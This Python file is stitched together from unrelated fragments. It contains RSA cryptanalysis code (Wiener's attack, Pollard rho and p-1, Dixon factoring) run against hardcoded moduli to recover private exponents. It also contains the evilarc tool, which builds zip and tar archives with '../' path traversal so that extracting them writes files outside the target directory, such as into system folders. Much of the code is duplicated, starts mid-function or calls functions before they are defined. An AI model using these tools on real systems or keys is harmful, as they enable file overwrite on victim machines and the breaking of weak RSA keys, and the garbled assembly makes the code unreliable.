    sq_mod256 = (1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0)
    if sq_mod256[n & 0xff] == 0:
        return False
    mt = (
        (9, (1,1,0,0,1,0,0,1,0)),
        (5, (1,1,0,0,1)),
        (7, (1,1,1,0,1,0,0)),
        (13, (1,1,0,1,1,0,0,0,0,1,1,0,1)),
        (17, (1,1,1,0,1,0,0,0,1,1,0,0,0,1,0,1,1))
    )
    a = n % (9 * 5 * 7 * 13 * 17)
    if any(t[a % m] == 0 for m, t in mt):
        return False
    return isqrt(n) ** 2 == n

def rational_to_contfrac(x: int, y: int) -> Iterator[int]:
    """
    ref: https://en.wikipedia.org/wiki/Euclidean_algorithm#Continued_fractions
    >>> list(rational_to_contfrac(4, 11))
    [0, 2, 1, 3]
    """
    while y:
        a = x // y
        yield a
        x, y = y, x - a * y

def contfrac_to_rational_iter(contfrac: Iterable[int]) -> Iterator[Tuple[int, int]]:
    """
    ref: https://www.cits.ruhr-uni-bochum.de/imperia/md/content/may/krypto2ss08/shortsecretexponents.pdf (6)
    """
    n0, d0 = 0, 1
    n1, d1 = 1, 0
    for q in contfrac:
        n = q * n1 + n0
        d = q * d1 + d0
        yield n, d
        n0, d0 = n1, d1
        n1, d1 = n, d

def convergents_from_contfrac(contfrac: Iterable[int]) -> Iterator[Tuple[int, int]]:
    """
    ref: https://www.cits.ruhr-uni-bochum.de/imperia/md/content/may/krypto2ss08/shortsecretexponents.pdf Section.3
    """
    n_, d_ = 1, 0
    for i, (n, d) in enumerate(contfrac_to_rational_iter(contfrac)):
        if i % 2 == 0:
            yield n + n_, d + d_
        else:
            yield n, d
        n_, d_ = n, d

def attack(e: int, n: int) -> Optional[int]:
    """
    ref: https://www.cits.ruhr-uni-bochum.de/imperia/md/content/may/krypto2ss08/shortsecretexponents.pdf Section.4    
    >>> attack(2621, 8927)
    5
    >>> attack(6792605526025, 9449868410449)
    569
    >>> attack(30749686305802061816334591167284030734478031427751495527922388099381921172620569310945418007467306454160014597828390709770861577479329793948103408489494025272834473555854835044153374978554414416305012267643957838998648651100705446875979573675767605387333733876537528353237076626094553367977134079292593746416875606876735717905892280664538346000950343671655257046364067221469807138232820446015769882472160551840052921930357988334306659120253114790638496480092361951536576427295789429197483597859657977832368912534761100269065509351345050758943674651053419982561094432258103614830448382949765459939698951824447818497599, 109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141)
    4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399
    """
    f_ = rational_to_contfrac(e, n)
    for k, dg in convergents_from_contfrac(f_):
        edg = e * dg
        phi = edg // k
        x = n - phi + 1
        if x % 2 == 0 and is_perfect_square((x // 2) ** 2 - n):
            g = edg - phi * k
            return (dg//g, factor_n(n,phi)[0], factor_n(n,phi)[1])
    return None


#TRY DIXON
print ("\n=== Dixon ===")
try:
  p, q = dixon_algorithm(N,2,30)
  print ("p: ",p)
  print ("q: ",q)
except:
  print("No solution found")
 
#TRY WIENER
print ("\n=== Wiener ===")
try:
  d,p,q = attack(e, N)
  if d==None:
    print ("No solution found")
  else:
    print ("p: ",p)
    print ("q: ",q)
except:
  print("No solution found")

#TRY POLLARD
print ("\n=== Pollard ===")
try:
  p = pollardp(N)
  q =N//p
  if p !=1:
    print ("p: ",p)
    print ("q: ",q)
  else:
    print("No solution found")
except:
  print("No solution found")

#RSA Encryption/Decryption Attempt
m=int.from_bytes(bytes([104, 101, 108, 108, 111]),byteorder="big")
c=pow(m,e,N)

try:
  n = p*q
  PHI=(p-1)*(q-1)
  d=(libnum.invmod(e, PHI))
  res=pow(c,d,n)
except:
  res=pow(c,d,N)
 
print ("\n=== Decryption ===")
if len(str(n)) == 0 or p == 1:
  print ("N =",N)
else:
  print ("N =",n)
  print ("p =",p)
  print ("q =",q)
print ("e =",e)
print ("Plaintext: ",m.to_bytes(5,byteorder="big"))
print ("Ciphertext: ",c,"\n")
print ("d =",d)
print ("Decrypt attempt: %s" % ((long_to_bytes(res))))

#POLLARD'S RHO ATTACK
from math import gcd 

def f(x,n):
    return (x*x+3) %n
 
def pollardrho(a):
    x=2
    y=2
    d=1
    while d==1:
        x=f(x,a)
        y=f(f(y,a,),a)
        d=gcd(abs(x-y),a)
 
        if d>1 and a>d:
            return d
        if d==a:
            return -1
 
 
#2803863320976766501 
#
val= 2803863320976766501  
factors = []
print ("Val=",val)
while val > 0:
  p = pollardrho(val)
  factors.append(p)
  val = val//p
  if val < 0:
    factors.pop()
    factors.append(-val)
  print (" -> ",val, "factors: ",factors)
print ("Factors: ",factors)

#WIENER'S ATTACK 
import owiener

e = 13093328595385160044165980293174831781402910433996829686049849079194139027017437963020433409654254598967784284273088466083085543342666840110989310331142491498938291460305295086828226541498060829091531200764423401195922683471453468703721689465669372303425266741388904901165666303328872760703619023190687995422691546642616899901532563750227860076575848959768161075100460255012577625565123868435724583614883870330213257657190685096528432418456665538846807560061020585626974490286664652793908833669424000276680931369139404546215686214432257377137376327944301552319505561125394344205596939320029134879444106807878438488137
n = 21986209349522598669810906865768024040510874833876982838576681331542309207547008218894072567095416373659497230133396569323359898371317789548133481802145312769895831863123149387038220821712773786960781756311664121510622866921173866500595409454901147010013471749478924826426822441873737331716495921635931883569963555187083485598206980529116827877795567026250074202265927360532074462873436662506582235080339443933241625359591476428997279199451820908821582619548286654231931531356251085596993523325271292315727665008270293782837742921563562663832006966733277787971278021005846570498685386487009374677868911522765753502223
d = owiener.attack(e, n)

if d is None:
    print("Failed")
else:
    print("Hacked d={}".format(d))

#POLLARD'S P-1 ATTACK 
import math 
import sympy 
         
def pollardp(n): 
   
    # initial base and exponent 
    a = 2
    i = 2
    timeout = time.time() + 5
    while(True): 
   
        a = pow(a,i,n) 
   
        # finding gcd of a-1 and n 
        # using math function 
        d = math.gcd((a-1), n) 
        # check if factor obtained 
        if (d > 1) or time.time() > timeout:
          #return the factor 
          return d 
          break
   
        # else increase exponent by one  
        # for next round 
        i += 1
  
# Input value
#n = 21986209349522598669810906865768024040510874833876982838576681331542309207547008218894072567095416373659497230133396569323359898371317789548133481802145312769895831863123149387038220821712773786960781756311664121510622866921173866500595409454901147010013471749478924826426822441873737331716495921635931883569664029406166894237139280241533848217910762040510143050929217489972349808534243037477778500615767710119356371033619421122313949906220807514060107908124009288976199091843428106334004261892565107708607571083847886449412826362715813080384237276174053794202906924753275662785197603078841146968364888109730374476080  
val= 21986209349522598669810906865768024040510874833876982838576681331542309207547008218894072567095416373659497230133396569323359898371317789548133481802145312769895831863123149387038220821712773786960781756311664121510622866921173866500595409454901147010013471749478924826426822441873737331716495921635931883569664029406166894237139280241533848217910762040510143050929217489972349808534243037477778500615767710119356371033619421122313949906220807514060107908124009288976199091843428106334004261892565107708607571083847886449412826362715813080384237276174053794202906924753275662785197603078841146968364888109730374476080

factors = []
print ("Val=",val)
while val > 1:
  p = pollardp(val)
  factors.append(p)
  val = val//p
  if val ==1 or p ==1:
    factors.pop()
    factors.append(val)
    break
  print (" -> ",val, "factors: ",factors)
print ("Factors: ",factors)

#DIXON'S FACTORIZATION ATTACK
 
def test_pair(a_pair, n, p_list):
  n1, n2 = a_pair
  result = True
  n1_padded = padded_possible(n1 * n1 % n, p_list)
  n2_padded = padded_possible(n2 * n2 % n, p_list)
  for i in range(len(p_list)):
    if (n1_padded[i][1] + n2_padded[i][1]) & 1:
      result = False
      break
  return result
 
def is_possible(n, p_list):
  result = False
  for a_prime in p_list:
    d, r = divmod(n, a_prime)
    while r == 0:
      if d == 1:
        result = True
        break
      n = d
      d, r = divmod(n, a_prime)
    if result == True:
      break
        
  return result
 
def get_factors(a_pair, n, p_list):
  n1, n2 = a_pair
  d1 = n1 * n2 % n
  n1_padded = padded_possible(n1 * n1 % n, p_list)
  n2_padded = padded_possible(n2 * n2 % n, p_list)
  comb = [(n1_padded[i][0], (n1_padded[i][1] + n2_padded[i][1]) // 2) for i in range(len(p_list))]
  d2 = 1
  for a_pair_2 in comb:
    d2 *= a_pair_2[0]**a_pair_2[1]
  f1 = gcd(d1 + d2, n)
  f2 = n // f1  
  return f1, f2
 
def padded_possible(n, p_list):
  result = []
  for a_prime in p_list:
    count = 0
    d, r = divmod(n, a_prime)      
    while r == 0:
      count += 1
      n = d
      d, r = divmod(n, a_prime)
    result.append((a_prime, count))   
  return result
 
def dixon_algorithm(n, starting_number, count):
  p_list, possibles, test_num, i = (2, 3, 5, 7), [], starting_number, 0
    
  while i < count:
    temp = (test_num * test_num) % n
    if is_possible(temp, p_list):
      possibles.append(test_num)
      i += 1
    test_num += 1
    
  pairs = [(possibles[i], possibles[j]) for i in range(1, count) for j in range(i)]
  goods = [a_pair for a_pair in pairs if test_pair(a_pair, n, p_list)]
  goods_keepers =[a_good for a_good in goods if get_factors(a_good, n, p_list)[0] != 1 and get_factors(a_good, n, p_list)[0] != n]
 
  if len(goods_keepers) == 0:
    result = 'No solution'
  else:
    result = get_factors(goods_keepers[0], n, p_list)
    
  return result
 
#4352436362456
#2803863320976766501
val=4352436362456 
factors = []
print ("Val=",val)
while type(val) == int:
  factors.append(dixon_algorithm(val,2,30)[0])
  val = dixon_algorithm(val,2,30)[1]
  if type(val) != int:
    factors.pop()
    factors.append("...")
  print (" -> ",val, "factors: ",factors)
print ("Factors: ",factors)

from typing import Tuple, Iterator, Iterable, Optional
from decimal import Decimal, getcontext

def factor_n(n, phi):
    # set hih enough precision for decimals
    getcontext().prec = len(str(n)) + 100
    p_plus_q = n + 1 - phi
    delta = Decimal((p_plus_q)**2 - 4*n)
    sqrt_d = int(delta.sqrt())
    p = (p_plus_q + sqrt_d) // 2
    q = (p_plus_q - sqrt_d) // 2
    assert p * q == n, "something went wrong"
    return(p, q)

def isqrt(n: int) -> int:
    """
    ref: https://en.wikipedia.org/wiki/Integer_square_root
    
    >>> isqrt(289)
    17
    >>> isqrt(2)
    1
    >>> isqrt(1000000 ** 2)
    1000000
    """
    if n == 0:
        return 0

    # ref: https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Rough_estimation
    x = 2 ** ((n.bit_length() + 1) // 2)
    while True:
        y = (x + n // x) // 2
        if y >= x:
            return x
        x = y


def is_perfect_square(n: int) -> bool:
    """
    ref: http://d.hatena.ne.jp/hnw/20140503
    ref: https://github.com/AlexeiSheplyakov/gmp.pkg/blob/master/mpn/generic/perfsqr.c
    >>> is_perfect_square(100)
    True
    
    >>> is_perfect_square(2000000000000000000000000000 ** 2)
    True
    >>> is_perfect_square(2000000000000000000000000000 ** 2 + 1)
    False
    """
    sq_mod256 = (1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0)
    if sq_mod256[n & 0xff] == 0:
        return False

    mt = (
        (9, (1,1,0,0,1,0,0,1,0)),
        (5, (1,1,0,0,1)),
        (7, (1,1,1,0,1,0,0)),
        (13, (1,1,0,1,1,0,0,0,0,1,1,0,1)),
        (17, (1,1,1,0,1,0,0,0,1,1,0,0,0,1,0,1,1))
    )
    a = n % (9 * 5 * 7 * 13 * 17)
    if any(t[a % m] == 0 for m, t in mt):
        return False

    return isqrt(n) ** 2 == n


def rational_to_contfrac(x: int, y: int) -> Iterator[int]:
    """
    ref: https://en.wikipedia.org/wiki/Euclidean_algorithm#Continued_fractions
    
    >>> list(rational_to_contfrac(4, 11))
    [0, 2, 1, 3]
    """
    while y:
        a = x // y
        yield a
        x, y = y, x - a * y


def contfrac_to_rational_iter(contfrac: Iterable[int]) -> Iterator[Tuple[int, int]]:
    """
    ref: https://www.cits.ruhr-uni-bochum.de/imperia/md/content/may/krypto2ss08/shortsecretexponents.pdf (6)
    """
    n0, d0 = 0, 1
    n1, d1 = 1, 0
    for q in contfrac:
        n = q * n1 + n0
        d = q * d1 + d0
        yield n, d
        n0, d0 = n1, d1
        n1, d1 = n, d


def convergents_from_contfrac(contfrac: Iterable[int]) -> Iterator[Tuple[int, int]]:
    """
    ref: https://www.cits.ruhr-uni-bochum.de/imperia/md/content/may/krypto2ss08/shortsecretexponents.pdf Section.3
    """
    n_, d_ = 1, 0
    for i, (n, d) in enumerate(contfrac_to_rational_iter(contfrac)):
        if i % 2 == 0:
            yield n + n_, d + d_
        else:
            yield n, d
        n_, d_ = n, d


def attack(e: int, n: int) -> Optional[int]:
    """
    ref: https://www.cits.ruhr-uni-bochum.de/imperia/md/content/may/krypto2ss08/shortsecretexponents.pdf Section.4
    
    >>> attack(2621, 8927)
    5
    >>> attack(6792605526025, 9449868410449)
    569
    >>> attack(30749686305802061816334591167284030734478031427751495527922388099381921172620569310945418007467306454160014597828390709770861577479329793948103408489494025272834473555854835044153374978554414416305012267643957838998648651100705446875979573675767605387333733876537528353237076626094553367977134079292593746416875606876735717905892280664538346000950343671655257046364067221469807138232820446015769882472160551840052921930357988334306659120253114790638496480092361951536576427295789429197483597859657977832368912534761100269065509351345050758943674651053419982561094432258103614830448382949765459939698951824447818497599, 109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141)
    4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399
    """
    f_ = rational_to_contfrac(e, n)
    for k, dg in convergents_from_contfrac(f_):
        edg = e * dg
        phi = edg // k
        x = n - phi + 1
        if x % 2 == 0 and is_perfect_square((x // 2) ** 2 - n):
            g = edg - phi * k
            print("p =",factor_n(n,phi)[0])
            print("q =",factor_n(n,phi)[1])
            return dg // g
    return None




n=  11504527348504158734037780170377498878712004214260381608730500717991815279122806648544220211648205780154761466805683032692581326833774139612636039191040833561873869035670800926010549835734364594410395476885067722861580093389878040520372281552748236896416214306849077757975842715196976800713818245047806206651294270657799988276627708411462924090113406327688546733972246647011570643506334873954567135880261896080553702646403928357768206828842771519038916167325592923329250827223365152756794305129647653055443711932408387687334586308353275284499524570044721152926963826516772537698976072032292400126788019940915306214671
e=  4540739216185503944360317693727598425914265679950045193021325112310705634291619065008907799345804742158053789146296680446894494207857215362393461454740251861270045084357114733204905034770917891701793191139362007652012678514584941575186023625310517580446149923208688962903396756745069246710893893015854244396440602337384016923965920177062914455924380937065037932267969029224822211730100507762697227846127311177385930201779337513938673664269014723153905166514932029992336846458567909977502925990713226059794678425101890459773253915812357018757128150035920553537530136211737469309110690361713502937223534374706564266353
d = attack(e, n)
if d is None:
    print("Failed")
else:
    print()
    print("Hacked d={}".format(d))

#!/usr/bin/env python
#
# Copyright (c) 2009, Neohapsis, Inc.
# All rights reserved.
#
# Implementation by Greg Ose and Patrick Toomey
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met: 
#
#  - Redistributions of source code must retain the above copyright notice, this list 
#    of conditions and the following disclaimer. 
#  - Redistributions in binary form must reproduce the above copyright notice, this 
#    list of conditions and the following disclaimer in the documentation and/or 
#    other materials provided with the distribution. 
#  - Neither the name of Neohapsis nor the names of its contributors may be used to 
#    endorse or promote products derived from this software without specific prior 
#    written permission. 
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE 
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR 
# ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES 
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; 
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
# ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS 
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. 

import sys, zipfile, tarfile, os, optparse

def main(argv=sys.argv):
	p = optparse.OptionParser(description = 'Create archive containing a file with directory traversal', 
								prog = 'evilarc',
								version = '0.1',
								usage = '%prog <input file>')
	p.add_option('--output-file', '-f', dest="out", help="File to output archive to.  Archive type is based off of file extension.  Supported extensions are zip, jar, tar, tar.bz2, tar.gz, and tgz.  Defaults to evil.zip.")
	p.set_default("out", "evil.zip")
	p.add_option('--depth', '-d', type="int", dest="depth", help="Number directories to traverse. Defaults to 8.")
	p.set_default("depth", 8)
	p.add_option('--os', '-o', dest="platform", help="OS platform for archive (win|unix). Defaults to win.")
	p.set_default("platform", "win")
	p.add_option('--path', '-p', dest="path", help="Path to include in filename after traversal.  Ex: WINDOWS\\System32\\")	
	p.set_default("path", "")
	options, arguments = p.parse_args()
	
	if len(arguments) != 1:
		p.error("Incorrect arguments")
		
	fname = arguments[0]
	if not os.path.exists(fname):
		sys.exit("Invalid input file")
		
	if options.platform == "win":
		dir = "..\\"
		if options.path and options.path[-1] != '\\':
			options.path += '\\'
	else:
		dir = "../"
		if options.path and options.path[-1] != '/':
			options.path += '/'

	zpath = dir*options.depth+options.path+os.path.basename(fname)
	print( "Creating " + options.out + " containing " + zpath	)
	ext = os.path.splitext(options.out)[1]
	if os.path.exists(options.out):
		wmode = 'a'
	else:
		wmode = 'w'
	if ext == ".zip" or ext == ".jar":
		zf = zipfile.ZipFile(options.out, wmode)
		zf.write(fname, zpath)
		zf.close()
		return
	elif ext == ".tar":
		mode = wmode
	elif ext == ".gz" or ext == ".tgz":
		mode = "w:gz"
	elif ext == ".bz2":
		mode = "w:bz2"
	else:
		sys.exit("Could not identify output archive format for " + ext)

	tf = tarfile.open(options.out, mode)
	tf.add(fname, zpath)
	tf.close()



if __name__ == '__main__':
     main(["input",".txt","%tb"])